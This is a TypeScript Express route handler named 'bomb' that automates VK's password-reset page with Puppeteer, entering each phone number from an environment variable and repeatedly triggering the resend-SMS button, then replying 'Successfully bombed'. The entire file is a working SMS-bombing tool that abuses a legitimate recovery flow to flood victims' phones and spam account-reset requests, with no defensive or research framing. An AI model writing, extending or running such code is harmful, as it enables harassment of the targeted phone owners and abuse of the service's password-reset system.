import { Request, Response } from "express";
import puppeteer from "puppeteer";
import wait from "./utils/wait";
import selectors from "./selectors";
import range from "./utils/range";
import fs from "node:fs";
import doesStrExistOnPage from "./utils/doesStrExistOnPage";
import clickResendSmsBtn from "./actions/clickResendSmsBtn";
import inputPhoneNumber from "./actions/inputPhoneNumber";
import pressEnter from "./actions/pressEnter";
import confirmFirstTime from "./actions/confirmFirstTime";
import confirmSecondTimeIfNeeded from "./actions/confirmSecondTimeIfNeeded";

export async function bomb(req: Request, res: Response) {
  const phoneNumbersStr = process.env.PHONE_NUMBERS;
  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
  
  const phoneNumbers = phoneNumbersStr.split(" ");
  
  const browser = await puppeteer.launch({ headless: false });
  console.log("Browser launched...");
  
  const promises = phoneNumbers.map(async phoneNumber => {
    const page = await browser.newPage();
    
    await page.goto("https://id.vk.com/restore/#/resetPassword");
    
    await inputPhoneNumber(page, phoneNumber);
    await pressEnter(page);
    
    await confirmFirstTime(page);
    await confirmSecondTimeIfNeeded(page);
    
    await clickResendSmsBtn(page);

    await wait(range(5000, 6000));
  });
  await Promise.all(promises);
  await browser.close();

  res.status(200).send("Successfully bombed");
}
